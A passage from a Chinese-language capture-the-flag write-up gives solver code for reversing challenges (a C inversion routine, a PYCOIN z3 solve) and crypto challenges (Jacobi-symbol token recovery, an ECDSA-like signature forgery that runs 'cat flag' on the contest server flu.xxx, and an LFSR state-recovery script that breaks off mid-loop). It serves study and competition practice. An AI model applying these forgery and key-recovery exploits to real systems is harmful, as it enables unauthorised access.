DWORD64 g_chunk_size = <span class="hljs-number">0</span>;

DWORD64 g_jieguo = <span class="hljs-number">0</span>;
DWORD64 g_chengshu = <span class="hljs-number">0</span>;

<span class="hljs-keyword">bool</span> g_finded_low = <span class="hljs-literal">false</span>;
DWORD64 g_find_val_low = <span class="hljs-number">0</span>;

<span class="hljs-keyword">bool</span> g_finded_high = <span class="hljs-literal">false</span>;
DWORD64 g_find_val_high = <span class="hljs-number">0</span>;
<span class="hljs-function">DWORD <span class="hljs-title">CalcThread</span><span class="hljs-params">(PVOID start_v)</span> </span>{
    DWORD64 ustartv = (DWORD64)start_v;
    DWORD targetv = g_jieguo &amp; <span class="hljs-number">0xFFFFFFFF</span>;
    DWORD chengshulow = g_chengshu &amp; <span class="hljs-number">0xFFFFFFFF</span>;
    <span class="hljs-keyword">for</span> (DWORD64 i = <span class="hljs-number">0</span>; i &lt; g_chunk_size; i++) {
        <span class="hljs-keyword">if</span> (
            (((ustartv + i) * chengshulow) &amp; <span class="hljs-number">0xFFFFFFFF</span>) == targetv
            ) {
            g_find_val_low = (ustartv + i);
            g_finded_low = <span class="hljs-literal">true</span>;
        }
        <span class="hljs-keyword">if</span> (g_finded_low)
            <span class="hljs-keyword">break</span>;
    }
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
<span class="hljs-function">DWORD <span class="hljs-title">CalcThreadHigh</span><span class="hljs-params">(PVOID start_v)</span> </span>{
    DWORD64 ustartv = (DWORD64)start_v;
    <span class="hljs-keyword">for</span> (DWORD64 i = <span class="hljs-number">0</span>; i &lt; g_chunk_size; i++) {
        ULONG64 vv = ((ustartv + i) &lt;&lt; <span class="hljs-number">32</span>) | (g_find_val_low);
        <span class="hljs-keyword">if</span> (
            (vv * g_chengshu) == g_jieguo
            ) {
            g_find_val_high = (ustartv + i);
            g_finded_high = <span class="hljs-literal">true</span>;
        }
        <span class="hljs-keyword">if</span> (g_finded_high)
            <span class="hljs-keyword">break</span>;
    }
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}

<span class="hljs-function">DWORD64 <span class="hljs-title">findchengshu</span><span class="hljs-params">(DWORD64 jieguo, DWORD64 chengshu)</span> </span>{
    g_chengshu = chengshu;
    g_jieguo = jieguo;
    g_finded_low = <span class="hljs-number">0</span>;
    g_find_val_low = <span class="hljs-number">0</span>;
    g_finded_high = <span class="hljs-number">0</span>;
    g_find_val_high = <span class="hljs-number">0</span>;

    <span class="hljs-keyword">int</span> heshu = <span class="hljs-number">8</span>;

    DWORD64 block_size = (<span class="hljs-number">0x100000000</span> / heshu);
    g_chunk_size = block_size;
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; heshu; i++) {
        DWORD tid = <span class="hljs-number">0</span>;
        CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, CalcThread, (LPVOID)(block_size * i), <span class="hljs-number">0</span>, &amp;tid);
    }

    <span class="hljs-keyword">while</span> (g_finded_low == <span class="hljs-literal">false</span>)
        Sleep(<span class="hljs-number">10</span>);
    
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; heshu; i++) {
        DWORD tid = <span class="hljs-number">0</span>;
        CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, CalcThreadHigh, (LPVOID)(block_size * i), <span class="hljs-number">0</span>, &amp;tid);
    }

    <span class="hljs-keyword">while</span> (g_finded_high == <span class="hljs-literal">false</span>)
        Sleep(<span class="hljs-number">10</span>);
    <span class="hljs-keyword">return</span> g_find_val_low | (((ULONG64)g_find_val_high) &lt;&lt; <span class="hljs-number">32</span>);
}
<span class="hljs-function">DWORD64 <span class="hljs-title">reneg</span><span class="hljs-params">(DWORD64 v)</span> </span>{
    <span class="hljs-keyword">return</span> ~v + <span class="hljs-number">1</span>;
}
<span class="hljs-function">DWORD64 <span class="hljs-title">re22</span><span class="hljs-params">(DWORD64 v)</span> </span>{
    DWORD64 _1 = v &amp; <span class="hljs-number">0xFF</span>;
    DWORD64 _2 = (v &amp; <span class="hljs-number">0xFF00</span>) &gt;&gt; <span class="hljs-number">8</span>;
    DWORD64 _3 = (v &amp; <span class="hljs-number">0xFFFFFF</span>) &gt;&gt; <span class="hljs-number">16</span>;
    DWORD64 _4 = (v &amp; <span class="hljs-number">0xFFFFFFFF</span>) &gt;&gt; <span class="hljs-number">24</span>;
    DWORD64 _5 = (v &amp; <span class="hljs-number">0xFFFFFFFFFF</span>) &gt;&gt; <span class="hljs-number">32</span>;
    DWORD64 _6 = (v &amp; <span class="hljs-number">0xFFFFFFFFFFFF</span>) &gt;&gt; <span class="hljs-number">40</span>;
    DWORD64 _7 = (v &amp; <span class="hljs-number">0xFFFFFFFFFFFFFF</span>) &gt;&gt; <span class="hljs-number">48</span>;
    DWORD64 _8 = (v &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>) &gt;&gt; <span class="hljs-number">56</span>;

    <span class="hljs-keyword">return</span> _2 | (_1 &lt;&lt; <span class="hljs-number">8</span>) | (_4 &lt;&lt; <span class="hljs-number">16</span>) | (_3 &lt;&lt; <span class="hljs-number">24</span>) | (_6 &lt;&lt; <span class="hljs-number">32</span>) | (_5 &lt;&lt; <span class="hljs-number">40</span>) | (_8 &lt;&lt; <span class="hljs-number">48</span>) | (_7 &lt;&lt; <span class="hljs-number">56</span>);

}
<span class="hljs-function">DWORD64 <span class="hljs-title">re15</span><span class="hljs-params">(DWORD64 v)</span> </span>{
    <span class="hljs-keyword">return</span> ((v &amp; <span class="hljs-number">0x00FFFFFFFFFFFFFF</span>) &lt;&lt; <span class="hljs-number">8</span>) | (v &gt;&gt; <span class="hljs-number">56</span>);
}
<span class="hljs-function">DWORD64 <span class="hljs-title">re9</span><span class="hljs-params">(DWORD64 v)</span> </span>{
    DWORD64 nv = ((v &gt;&gt; <span class="hljs-number">32</span>) &amp; <span class="hljs-number">0xFFFFFFFF</span>) | (v &lt;&lt; <span class="hljs-number">32</span>);

    <span class="hljs-keyword">return</span> nv ^ <span class="hljs-number">0xCE9A20C53746A9F7</span>;
}
<span class="hljs-function">DWORD64 <span class="hljs-title">invertVal</span><span class="hljs-params">(DWORD64 v)</span> </span>{
    v = reneg(v);
    v = findchengshu(v, <span class="hljs-number">0x51F6D71704B266F5</span>);
    v = v ^ <span class="hljs-number">0xB9B8A788569D772D</span>;
    v = re22(v);
    v -= <span class="hljs-number">0x29D5CA44D143B4FC</span>;
    v ^= <span class="hljs-number">0x326DEB9C5D995AEB</span>;
    v = re15(v);
    v -= <span class="hljs-number">0x18B205A73CB902B7</span>;
    v = findchengshu(v, <span class="hljs-number">0xA648BD40DACE4EF5</span>);
    v = re9(v);
    v -= <span class="hljs-number">0x8BC715D20D923835</span>;
    v ^= <span class="hljs-number">0xB31C9545AC410D72</span>;
    v = reneg(v);
    v += <span class="hljs-number">0x4DDB14EE5C8771C5</span>;
    v = ~v + <span class="hljs-number">1</span>;

    <span class="hljs-keyword">return</span> v;
}
<span class="hljs-function">DWORD64 <span class="hljs-title">reval</span><span class="hljs-params">(DWORD64 v)</span> </span>{
    DWORD64 _1 = v &amp; <span class="hljs-number">0xFF</span>;
    DWORD64 _2 = (v &amp; <span class="hljs-number">0xFF00</span>) &gt;&gt; <span class="hljs-number">8</span>;
    DWORD64 _3 = (v &amp; <span class="hljs-number">0xFFFFFF</span>) &gt;&gt; <span class="hljs-number">16</span>;
    DWORD64 _4 = (v &amp; <span class="hljs-number">0xFFFFFFFF</span>) &gt;&gt; <span class="hljs-number">24</span>;
    DWORD64 _5 = (v &amp; <span class="hljs-number">0xFFFFFFFFFF</span>) &gt;&gt; <span class="hljs-number">32</span>;
    DWORD64 _6 = (v &amp; <span class="hljs-number">0xFFFFFFFFFFFF</span>) &gt;&gt; <span class="hljs-number">40</span>;
    DWORD64 _7 = (v &amp; <span class="hljs-number">0xFFFFFFFFFFFFFF</span>) &gt;&gt; <span class="hljs-number">48</span>;
    DWORD64 _8 = (v &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>) &gt;&gt; <span class="hljs-number">56</span>;

    <span class="hljs-keyword">return</span> _8 | (_7 &lt;&lt; <span class="hljs-number">8</span>) | (_6 &lt;&lt; <span class="hljs-number">16</span>) | (_5 &lt;&lt; <span class="hljs-number">24</span>) | (_4 &lt;&lt; <span class="hljs-number">32</span>) | (_3 &lt;&lt; <span class="hljs-number">40</span>) | (_2 &lt;&lt; <span class="hljs-number">48</span>) | (_1 &lt;&lt; <span class="hljs-number">56</span>);
}
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>
</span>{
    DWORD64 val[<span class="hljs-number">9</span>]; 
    val[<span class="hljs-number">8</span>] = <span class="hljs-number">0</span>;
    val[<span class="hljs-number">0</span>] = reval(invertVal(<span class="hljs-number">0x875cd4f2e18f8fc4</span>));
    val[<span class="hljs-number">1</span>] = reval(invertVal(<span class="hljs-number">0xbb093e17e5d3fa42</span>));
    val[<span class="hljs-number">2</span>] = reval(invertVal(<span class="hljs-number">0xada5dd034aae16b4</span>));
    val[<span class="hljs-number">3</span>] = reval(invertVal(<span class="hljs-number">0x97322728fea51225</span>));
    val[<span class="hljs-number">4</span>] = reval(invertVal(<span class="hljs-number">0x4124799d72188d0d</span>));
    val[<span class="hljs-number">5</span>] = reval(invertVal(<span class="hljs-number">0x2b3e3fbbb4d44981</span>));
    val[<span class="hljs-number">6</span>] = reval(invertVal(<span class="hljs-number">0xdfcac668321e4daa</span>));
    val[<span class="hljs-number">7</span>] = reval(invertVal(<span class="hljs-number">0xeac2137a35c8923a</span>));
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, val);
}</code></pre><h3 id="pycoinlow"><a class="header-link" href="#pycoinlow"></a>PYCOIN(Low)</h3>
<p>先使用uncompyle6反编译，发现执行了一串marshal字节码
将该字节码输出到文件，然后根据题目给的pyc补全文件头
再次反编译发现有花指令，开头和中间各有一个 <code>jump_forward</code>，中间还有两个连续的 <code>rot_tow</code>
花指令全替换成nop就可以进行反编译了</p>
<pre class="hljs"><code><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5
k = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;please supply a valid key:&#x27;</span>)).encode()
correct = <span class="hljs-built_in">len</span>(k) == <span class="hljs-number">16</span> <span class="hljs-keyword">and</span> k[<span class="hljs-number">0</span>] == <span class="hljs-number">102</span> <span class="hljs-keyword">and</span> k[<span class="hljs-number">1</span>] == k[<span class="hljs-number">0</span>] + <span class="hljs-number">6</span> <span class="hljs-keyword">and</span> k[<span class="hljs-number">2</span>] == k[<span class="hljs-number">1</span>] - k[<span class="hljs-number">0</span>] + <span class="hljs-number">91</span> <span class="hljs-keyword">and</span> k[<span class="hljs-number">3</span>] == <span class="hljs-number">103</span> <span class="hljs-keyword">and</span> k[<span class="hljs-number">4</span>] == k[<span class="hljs-number">11</span>] * <span class="hljs-number">3</span> - <span class="hljs-number">42</span> <span class="hljs-keyword">and</span> k[<span class="hljs-number">5</span>] == <span class="hljs-built_in">sum</span>(k) - <span class="hljs-number">1322</span> <span class="hljs-keyword">and</span> k[<span class="hljs-number">6</span>] + k[<span class="hljs-number">7</span>] + k[<span class="hljs-number">10</span>] == <span class="hljs-number">260</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">int</span>(<span class="hljs-built_in">chr</span>(k[<span class="hljs-number">7</span>]) * <span class="hljs-number">2</span>) + <span class="hljs-number">1</span> == k[<span class="hljs-number">9</span>] <span class="hljs-keyword">and</span> k[<span class="hljs-number">8</span>] % <span class="hljs-number">17</span> == <span class="hljs-number">16</span> <span class="hljs-keyword">and</span> k[<span class="hljs-number">9</span>] == k[<span class="hljs-number">8</span>] * <span class="hljs-number">2</span> <span class="hljs-keyword">and</span> md5(k[<span class="hljs-number">10</span>] * <span class="hljs-string">b&#x27;a&#x27;</span>).digest()[<span class="hljs-number">0</span>] - <span class="hljs-number">1</span> == k[<span class="hljs-number">3</span>] <span class="hljs-keyword">and</span> k[<span class="hljs-number">11</span>] == <span class="hljs-number">55</span> <span class="hljs-keyword">and</span> k[<span class="hljs-number">12</span>] == k[<span class="hljs-number">14</span>] / <span class="hljs-number">2</span> - <span class="hljs-number">2</span> <span class="hljs-keyword">and</span> k[<span class="hljs-number">13</span>] == k[<span class="hljs-number">10</span>] * k[<span class="hljs-number">8</span>] % <span class="hljs-number">32</span> * <span class="hljs-number">2</span> - <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> k[<span class="hljs-number">14</span>] == (k[<span class="hljs-number">12</span>] ^ k[<span class="hljs-number">9</span>] ^ k[<span class="hljs-number">15</span>]) * <span class="hljs-number">3</span> - <span class="hljs-number">23</span> <span class="hljs-keyword">and</span> k[<span class="hljs-number">15</span>] == <span class="hljs-number">125</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;valid key! <span class="hljs-subst">{k.decode()}</span>&quot;</span> 
      <span class="hljs-keyword">if</span> correct <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;invalid key :(&#x27;</span>)</code></pre><p>随后用z3求解</p>
<pre class="hljs"><code><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *

s = Solver()

k = [BitVec(<span class="hljs-string">&#x27;k%d&#x27;</span> % i, <span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)]

s.add(k[<span class="hljs-number">0</span>] == <span class="hljs-number">102</span>)
s.add(k[<span class="hljs-number">1</span>] == k[<span class="hljs-number">0</span>] + <span class="hljs-number">6</span>)
s.add(k[<span class="hljs-number">2</span>] == (k[<span class="hljs-number">1</span>] - k[<span class="hljs-number">0</span>]) + <span class="hljs-number">91</span>)
s.add(k[<span class="hljs-number">3</span>] == <span class="hljs-number">103</span>)
s.add(k[<span class="hljs-number">4</span>] == k[<span class="hljs-number">11</span>] * <span class="hljs-number">3</span> - <span class="hljs-number">42</span>)
s.add(k[<span class="hljs-number">11</span>] == <span class="hljs-number">55</span>)
s.add(k[<span class="hljs-number">10</span>] == <span class="hljs-number">101</span>)
s.add(k[<span class="hljs-number">15</span>] == <span class="hljs-number">125</span>)
s.add(k[<span class="hljs-number">5</span>] == <span class="hljs-built_in">sum</span>(k) - <span class="hljs-number">1322</span>)
s.add(k[<span class="hljs-number">6</span>] + k[<span class="hljs-number">7</span>] + k[<span class="hljs-number">10</span>] == <span class="hljs-number">260</span>)
<span class="hljs-comment"># s.add(int(chr(k[7]) * 2) + 1 == k[9])</span>
s.add(k[<span class="hljs-number">7</span>] &gt; <span class="hljs-number">0x30</span>)
s.add(k[<span class="hljs-number">7</span>] &lt; <span class="hljs-number">0x40</span>)
s.add((k[<span class="hljs-number">7</span>] - <span class="hljs-number">0x30</span>) * <span class="hljs-number">11</span> + <span class="hljs-number">1</span> == k[<span class="hljs-number">9</span>])
s.add(k[<span class="hljs-number">8</span>] % <span class="hljs-number">17</span> == <span class="hljs-number">16</span>)
s.add(k[<span class="hljs-number">9</span>] == k[<span class="hljs-number">8</span>] * <span class="hljs-number">2</span>)
<span class="hljs-comment"># s.add(md5(k[10] * b&#x27;a&#x27;).digest()[0] - 1 == k[3])</span>
s.add(k[<span class="hljs-number">12</span>] == k[<span class="hljs-number">14</span>] / <span class="hljs-number">2</span> - <span class="hljs-number">2</span>)
s.add(k[<span class="hljs-number">13</span>] == (k[<span class="hljs-number">10</span>] * k[<span class="hljs-number">8</span>] % <span class="hljs-number">32</span>) * <span class="hljs-number">2</span> - <span class="hljs-number">1</span>)
s.add(k[<span class="hljs-number">14</span>] == (k[<span class="hljs-number">12</span>] ^ k[<span class="hljs-number">9</span>] ^ k[<span class="hljs-number">15</span>]) * <span class="hljs-number">3</span> - <span class="hljs-number">23</span>)

<span class="hljs-keyword">if</span> s.check():
    model = s.model()
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):
        <span class="hljs-keyword">if</span> i == <span class="hljs-number">5</span>:
            <span class="hljs-keyword">continue</span>
        <span class="hljs-built_in">print</span> (<span class="hljs-built_in">chr</span>(model[k[i]].as_long()), end=<span class="hljs-string">&#x27;&#x27;</span>)
<span class="hljs-keyword">else</span>:
    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;No result&quot;</span>)
<span class="hljs-comment">#flag{f92de703d}</span></code></pre><h2 id="crypto"><a class="header-link" href="#crypto"></a>Crypto</h2>
<h3 id="silver-water-industrieslow"><a class="header-link" href="#silver-water-industrieslow"></a>Silver Water Industries(Low)</h3>
<p>go语言写的加密，审计一下代码，大致意思就是首先随机产生一个token和N，然后加密token，加密方式为一个字节8个比特，每次产生一个x,若该比特为0，结果为x^2 %N,否则结果为-x^2 %n。显然利用二次剩余来做，如果c,n的雅可比符号为1则为0,否则为1,还原token，再传给服务器</p>
<pre class="hljs"><code><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *

n=<span class="hljs-number">285093357453242924013602862066919842439</span>
c=[<span class="hljs-string">&#x27;[7901544350463174591988078511923324618 184537633212194745105080990647249325476 38267354157968351348766484298141745170 115578755446448863198748495896654060883 227909878717027446328962010664108571738 68952806770118848950271133491209711403 102984378629787175198877216543195333448 113165098929714836603634331678300868297]&#x27;</span>,
<span class="hljs-string">&#x27;[275785769863995996812546673147981657234 282132616793095905121920207741461086689 199143850961491870800209491624969361487 183070115427467531790361759454036865061 174393613375943957860321020903916142619 275194645696846365608618082603600388856 69288446973059562436205397370105909769 250845592176683528425664336374779963821]&#x27;</span>,
<span class="hljs-string">&#x27;[240850912688047949049104289493502779367 37079483245590817588925021564795982646 284919536320463992115907743100691646551 267192067339793515017095456897132371813 121182789195982671419488187218656063538 130399763650220078736112759705997664043 58302430717741410187195454791677533281 52776571634234783572905063268137693827]&#x27;</span>,
<span class="hljs-string">&#x27;[169777727664099029285002240103810929277 154451872004779288578874468507232138100 82607738862097099187707193194906553213 74662089586650151383705654824195379245 163301594729741444134552005626107105446 108759358332127220212407980222708706220 246214280347131537365215918063843772859 116415814239906926802482107105787268443]&#x27;</span>,
<span class="hljs-string">&#x27;[908795231417421999718079313192191569 113455638257352165842372458444946217639 227447469062670411453330654385127815004 283532690966429919679614173872514718001 276175993211834485081856703624558763131 173640901552892130398996800843730480762 76779834958653181435792827716925863702 206290664138933571395486720765404890504]&#x27;</span>,
<span class="hljs-string">&#x27;[123026279266464883266609008668623052393 40509778382957676307060245062252843393 95602462953785104138868279951166751882 43531259745075979730966911287989076615 82865327448522727488114604383808371535 207895953061666333553235571802877275412 65646216101552631749973551787307289641 123721676641648433423267884043005926042]&#x27;</span>,
<span class="hljs-string">&#x27;[84235175585568651415313489109394597433 19269802923648441086555654660091822017 55658696563260880937491989834257209829 234537578061003475348324817681194241847 59802057487646966284905470410391468989 128776397130280003156298859718500600288 58714047777453918627738504174915596756 5382371557403759511409510761755596277]&#x27;</span>,
<span class="hljs-string">&#x27;[142277648732395720338819526212844406606 105745456860747198927985508383729091578 7664467883802846117259187758423823692 192823773181406078295010428559954020697 35520988140119792330289151131523684908 76369098233361904415663724932463253635 257882448880941611481506133326850304617 201269699223045546065503672803127316556]&#x27;</span>,
<span class="hljs-string">&#x27;[184609218721168183180805721365560584754 185020056544825781738449415772019342386 128805039558112680342001303071294028640 10656747463930421123322245691391167264 256942413240582039041230005139151025018 199624812561500081484838114437018161725 261608146489322534451783563132106825107 197042738069178244994802319518477132885]&#x27;</span>,
<span class="hljs-string">&#x27;[270173223698478270395600379839285853220 57941625935617136420077100942293109042 42866159881477101699934525188688478291 246776886005156260287696971384169750083 137171422362434302212095391922793796625 189256954049770715201795707892595939413 122402164719872436761127887207817393790 98066517796093669928393689884743077086]&#x27;</span>,
<span class="hljs-string">&#x27;[228483823411430971765632614756935594262 270867761665365061602695324172148308695 270682585589276777781448680945567679788 213507765198029256400141067987133373726 76037731708593018888930325428923617568 30682862786884871003242427010850491072 167298978250225467829760031606711270085 72822666625837066035637817957473696601]&#x27;</span>,
<span class="hljs-string">&#x27;[195360134168787557177461554506460108718 122308058514175020254833726324781052273 225146579830375254258394356703192766275 141448314831908836605197528091870487865 150984932528304035512378115089222613654 258513501018477452331175661114007493672 280750213283721060295861114047761297997 149688812218926847069069885299483586476]&#x27;</span>,
<span class="hljs-string">&#x27;[39751280632280049247741325771978681046 126855003643133686822494937986884309325 115180417419233183793165658750256344391 165938790171278140853730464165871696036 125785499316292959084455022571711272463 113018734944080600564983861961988444496 121333906833173879138713882299961654246 74854082980047960871154066988489234830]&#x27;</span>,
<span class="hljs-string">&#x27;[137318192742872999161232833053514199378 77303525632818524122343716610518443942 160269374197044199668350654249626402587 115833901383881866816610270277305149900 208252536116807546101734823290785501108 217944947974996128948835835464385601397 166097670266427048341426239212284108828 6804019980433054638881349231392552603]&#x27;</span>,
<span class="hljs-string">&#x27;[223303329908928292177045252540723878662 162073383009692124348835494388447606848 75684161198666039016621659050855083132 214809882035378545846738708974574594313 87881170698279792546809027489142288582 209684762911442115958995698637848828382 62250525374182677523486425819610947199 279847608325021186228379026650485946576]&#x27;</span>,
<span class="hljs-string">&#x27;[67984665902369694514999957506279439994 268381222641753282423880203957876639758 246945134892118899884699312748250139309 65992451070302178885369398606163545606 116843550219931501998786016165547932075 183992253565936581165613292055256448566 263733379385279468893508349748581537056 271771128787717918335624952723447691861]&#x27;</span>,
<span class="hljs-string">&#x27;[243684657592111494155573374100758277706 199888678572875313963836033529833113400 144529013312000077536517713640604480652 195346356780285790893865181659755080639 177192461902687091902497281184780912038 98619970825132499781249548734139906601 75338491010152968387510315283944125602 235096138241797869586420967960223530601]&#x27;</span>,
<span class="hljs-string">&#x27;[72151893808127002595348778087435224319 81726004275189558083196981094140189988 120182868897691025353764768886735207100 202139727058084483577259545137210899092 172363102516135760004141577739481722490 47134074008080627610223569691660297614 123362836929825076302183828024021376167 223183587970484310511105130772286701816]&#x27;</span>,
<span class="hljs-string">&#x27;[198229942846513253072302724550917821624 203790104834341577744516837088067561528 268462473934338408807986146010492366120 2838111217330153826487758479090332221 24168375885146064383306126685127043568 106145968666962799863332198895828734493 210842459276905023853370050105467358280 279918790313996396021668388694087973972]&#x27;</span>,
<span class="hljs-string">&#x27;[279958295787638180753395460799528194681 282632555284078775050842945928105322059 236625278255622713621309747554901434361 152370360457970139981070013834891821455 279957343826025692192966948867958440827 283163488212063405065442268900136281469 13585301929645503773034214420121810733 84973170341472624058356167001596150486]&#x27;</span>]

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> c:
    temp=i[<span class="hljs-number">1</span>:-<span class="hljs-number">1</span>].split(<span class="hljs-string">&#x27; &#x27;</span>)
    flag=<span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">if</span> jacobi(<span class="hljs-built_in">int</span>(j),n)==<span class="hljs-number">1</span>  <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> temp])
    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(flag,<span class="hljs-number">2</span>)),end=<span class="hljs-string">&#x27;&#x27;</span>)
<span class="hljs-comment">#token=XF38YOg92IRNyugYD7go</span>
<span class="hljs-comment">#flag{Oh_NO_aT_LEast_mY_AlGORithM_is_ExpanDiNg}    </span></code></pre><h3 id="whattheheccmid"><a class="header-link" href="#whattheheccmid"></a>WhatTheHecc(mid):</h3>
<p>感觉可能是非预期？</p>
<p>题目里提供了sign，run，show功能，但sign里支持的命令有限，而如果我们需要通过run拿到flag则需要伪造签名，因此看一下verify函数，可以得知：</p>
<p class="img-container"><img src="https://i.imgur.com/fq5nnKL.png" alt=""></p>
<p>但这里实现有点问题，verify的sig是能够自己控制的，因此如果</p>
<p class="img-container"><img src="https://i.imgur.com/xevQDXy.png" alt=""></p>
<p>则此时同样等式成立，验证通过</p>
<pre class="hljs"><code><span class="hljs-keyword">from</span> netcat <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> Cryptodome.Hash <span class="hljs-keyword">import</span> SHA3_256
<span class="hljs-keyword">from</span> Cryptodome.PublicKey <span class="hljs-keyword">import</span> ECC
<span class="hljs-keyword">from</span> Cryptodome.Math.Numbers <span class="hljs-keyword">import</span> Integer

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hash</span>(<span class="hljs-params">msg</span>):</span>
    h_obj = SHA3_256.new()
    h_obj.update(msg.encode())
    <span class="hljs-keyword">return</span> Integer.from_bytes(h_obj.digest())


r = remote(<span class="hljs-string">&quot;flu.xxx&quot;</span>, <span class="hljs-number">20085</span>)
<span class="hljs-built_in">print</span>(r.recv_until(<span class="hljs-string">b&quot;&gt;&quot;</span>))
r.sendline(<span class="hljs-string">b&quot;show&quot;</span>)
r.recv_until(<span class="hljs-string">b&quot;point_x=&quot;</span>)
Rx = <span class="hljs-built_in">int</span>(r.recv_until(<span class="hljs-string">b&quot;, point_y=&quot;</span>).decode().replace(<span class="hljs-string">&quot;, point_y=&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))
Ry = <span class="hljs-built_in">int</span>(r.recv_until(<span class="hljs-string">b&quot;)&quot;</span>).decode().replace(<span class="hljs-string">&quot;)&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))
<span class="hljs-built_in">print</span>(Rx, Ry)

hmsg = <span class="hljs-built_in">hash</span>(<span class="hljs-string">&quot;cat flag&quot;</span>)
ecc = ECC.generate(curve=<span class="hljs-string">&#x27;P-256&#x27;</span>)
tmp = hmsg * ecc._curve.G
hx, hy = tmp.x, tmp.y
<span class="hljs-built_in">print</span>(hx, hy)

<span class="hljs-built_in">print</span>(r.recv_until(<span class="hljs-string">b&quot;&gt;&quot;</span>))
r.sendline(<span class="hljs-string">b&quot;run&quot;</span>)
sig = <span class="hljs-string">f&quot;<span class="hljs-subst">{Rx}</span>|<span class="hljs-subst">{Ry}</span>|<span class="hljs-subst">{hmsg}</span>|cat flag&quot;</span>
<span class="hljs-built_in">print</span>(r.recv_until(<span class="hljs-string">b&quot;&gt;&quot;</span>))
r.sendline(sig.encode())
<span class="hljs-built_in">print</span>(r.recv_until(<span class="hljs-string">b&quot;}&quot;</span>))

r.close()</code></pre><h3 id="lwsrmid"><a class="header-link" href="#lwsrmid"></a>lwsr(mid):</h3>
<p>(当时比赛的时候没有做出来,就差了一点,本地通了,远程出了一些问题,但还是复现一下)</p>
<p>每次decrypt能够知道state&amp;1，因此如结果为Success!，则state的末尾比特为1，反之则为0，而每次lfsr产生的newbit在首位，因此如果交互384次，就能拿到clear LFSR bits后的初始比特。然后再回推最原始的状态，每次一位，那么每次只用考虑爆破1bit，然后检查lfsr(回推值)是否等于当前值，回退384+len(ct)次即可。得到初始状态后只需要再相应密文位减去pk，判断c%q是否为0即可，为0则当前明文比特为0，反之为1。</p>
<pre class="hljs"><code><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes
<span class="hljs-keyword">from</span> netcat <span class="hljs-keyword">import</span> *

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">lfsr</span>(<span class="hljs-params">state</span>):</span>
    <span class="hljs-comment"># x^384 + x^8 + x^7 + x^6 + x^4 + x^3 + x^2 + x + 1</span>
    mask   = (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">384</span>) - (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">377</span>) + <span class="hljs-number">1</span>
    newbit = <span class="hljs-built_in">bin</span>(state &amp; mask).count(<span class="hljs-string">&#x27;1&#x27;</span>) &amp; <span class="hljs-number">1</span>
    <span class="hljs-keyword">return</span> (state &gt;&gt; <span class="hljs-number">1</span>) | (newbit &lt;&lt; <span class="hljs-number">383</span>)

r = remote(<span class="hljs-string">&quot;flu.xxx&quot;</span>, <span class="hljs-number">20075</span>)
r.recvuntil(<span class="hljs-string">b&quot;Public key (q = 16411):&quot;</span>)
tmp = r.recvuntil(<span class="hljs-string">b&quot;Encrypting flag:\n&quot;</span>).decode().replace(<span class="hljs-string">&quot;Encrypting flag:\n&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)
pk = <span class="hljs-built_in">eval</span>(tmp)
length = <span class="hljs-number">352</span>
ct = []
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length):
    tmp = r.recvuntil(<span class="hljs-string">b&quot;\n&quot;</span>).strip().decode()
    <span class="hljs-comment">#print(tmp)</span>
    c = <span class="hljs-built_in">eval</span>(tmp)
    <span class="hljs-comment">#print(c[1], c)</span>
    ct.append(c)

s = <span class="hljs-string">&quot;&quot;</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">384</span>):
    r.recvuntil(<span class="hljs-string">b&quot;Your message bit: \n&quot;</span>)
    r.sendline(<span class="hljs-string">b&quot;1&quot;</span>)
    res = r.recvuntil(<span class="hljs-string">b&quot;\n&quot;</span>).strip()
    <span class="hljs-keyword">if</span> res == <span class="hljs-string">b&quot;Success!&quot;</span>:
        <span class="hljs-comment">#print(1, res)</span>
        s = <span class="hljs-string">&quot;1&quot;</span> + s
    <span class="hljs-keyword">else</span>:
        <span class="hljs-comment">#print(0, res)</span>
        s = <span class="hljs-string">&quot;0&quot;</span> + s

